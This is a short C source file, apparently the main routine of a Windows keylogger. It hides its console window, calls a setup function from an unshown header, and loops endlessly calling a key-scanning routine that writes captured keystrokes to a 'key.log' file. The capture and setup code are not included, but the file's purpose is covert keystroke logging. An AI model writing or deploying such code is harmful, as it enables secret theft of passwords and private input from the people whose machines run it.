#include <stdio.h>
#include <stdlib.h>

#include "keyscan.h"
#include "setup.h"

#define KEY_FILE "key.log"

int main(int argc, char **argv){
    char path[LEN_VALUE_NAME] = {'\0'};
    FreeConsole();
    setup(path);
    sprintf_s(path, LEN_VALUE_NAME, "%s\\%s", dirname(path), KEY_FILE);
    while(true){
        scanCode(path);
    }
    return 0;
}
